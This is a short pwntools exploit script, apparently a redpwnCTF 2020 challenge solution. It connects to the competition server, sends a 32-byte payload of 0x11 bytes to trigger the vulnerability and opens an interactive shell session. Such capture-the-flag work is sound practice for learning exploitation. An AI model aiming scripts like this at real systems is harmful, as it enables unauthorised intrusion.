from pwn import *

p = remote('2020.redpwnc.tf', 31199)

p.recvrepeat(1)


p.sendline('\x11'*0x20)


p.interactive()
